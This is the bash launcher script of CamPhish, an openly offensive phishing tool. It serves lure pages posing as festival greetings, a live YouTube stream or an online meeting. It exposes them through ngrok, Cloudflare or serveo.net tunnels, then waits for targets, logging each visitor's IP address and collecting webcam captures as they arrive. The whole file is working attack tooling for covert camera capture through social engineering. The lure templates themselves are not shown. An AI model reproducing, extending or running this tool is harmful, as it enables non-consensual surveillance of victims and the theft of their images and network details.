#!/bin/bash
# CamPhish v1.6
# Powered by TechChip
# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2
banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 1.5 \e[0m \n"
printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"

printf "\n"


}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
checkcloudflare=$(ps aux | grep -o "cloudflare" | head -n1) # According to camphish code
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkcloudflare == *'cloudflare'* ]]; then # According to camphish code
killall -2 cloudflare > /dev/null 2>&1
pkill -f -2 cloudflare > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payloads() {
	if [[ $option_server == "1" ]]; then 
		link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
	elif [[ $option_server == "2" ]]; then
		link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloud.log")
	else
		send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" "sendlink")
	fi
	sed 's+forwarding_link+'$link'+g' template.php > index.php
	if [[ $option_tem -eq 1 ]]; then
		sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
		sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
	elif [[ $option_tem -eq 2 ]]; then
		sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
		sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
	else
		sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
	fi
	rm -rf index3.html
}

select_template() {
if [[ $option_server -gt 3 || $option_server -lt 1 ]]; then
printf "\n\e[1;93m [!] Invalid template option!: \e[0m$option_server \e[1;93mtry again!!\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
printf ""
else
printf "\n\e[1;93m [!] Invalid template option!: \e[0m$option_server \e[1;93mtry again!!\e[0m\n"
sleep 1
select_template
fi
fi
}

cloudflare_server(){ # According to camphish code
	if [[ `command -v ./cloudflare` && -e cloudflare ]]; then
		sleep 1
		printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflare is installed\n"
	else 
		if [[ "$arch" == *'arm'* || "$arch2" == *'Android'* ]]; then
        	cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        elif [[ "$arch" == *'aarch64'* ]]; then
        	cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif [[ "$arch" == *'x86_64'* ]];then
        	if [[ "$ArNam" == *'amd64'* ]]; then
        		cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        	else
        		cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        	fi
        else
        	cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
        fi
         printf "\n\e[1;92m[\e[0m+\e[1;92m] Downloading cloudflare...\n"
         wget --quiet ${cloudd} -O cloudflare > /dev/null 2>&1 
         chmod +x cloudflare
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflare server...\n"
    [[ -e .cloud.log ]] && rm -rf .cloud.log && touch .cloud.log
    if [[ `command -v termux-chroot` || "$arch2" == "Android" ]]; then
    	termux-chroot ./cloudflare tunnel --url 127.0.0.1:3333 --logfile .cloud.log > /dev/null 2>&1 & sleep 5 
    else
    	./cloudflare tunnel --url 127.0.0.1:3333 --logfile .cloud.log  > /dev/null 2>&1 & sleep 5
    fi
	link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloud.log");
	printf "\n\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n\e[0;0m" $link
	payloads
	checkfound
}

ngrok_server() {
if [[ `command -v ./ngrok` && -e ngrok ]]; then
	echo -e "\n\e[1;92m[\e[0m*\e[1;92m] ngrok is installed\n"
else
	command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
	command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
	if [[ ("$arch" == *'arm'*) || ("$arch2" == *'Android'*) ]]; then
		ngrok_url="https://github.com/E343IO/stuff/raw/main/ngrok-2in1.zip"
	elif [[ "$arch" == *'aarch64'* ]]; then
		if [[ "$ArNam" == *'amd64'* ]]; then
			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
		else
			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
		fi
	elif [[ "$arch" == *'x86_64'* ]]; then
		if [[ "$ArNam" == *'amd64'* ]]; then
			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
		else
			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
		fi
	else
		ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
	fi
	printf "\n\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
	wget --quiet ${ngrok_url} -O ngrok.zip
	unzip -q ngrok.zip && rm -rf ngrok.zip && chmod +x ngrok

fi
if [[ -e ~/.ngrok2/ngrok.yml ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
cat  ~/.ngrok2/ngrok.yml
read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
printf "\n\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
fi
else
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
fi
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payloads
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template
if [[ $option_server == 1 ]]; then
	ngrok_server
elif [[ $option_server == 2 ]]; then
	cloudflare_server
elif [[ $option_server == 3 ]]; then
	command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
	start
else
	printf "\n\e[1;93m [!] Invalid option!: \e[0m$option_server\n"
	sleep 1
	clear
	camphish
fi
};
start() {
default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payloads
checkfound
}
banner
dependencies
camphish
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
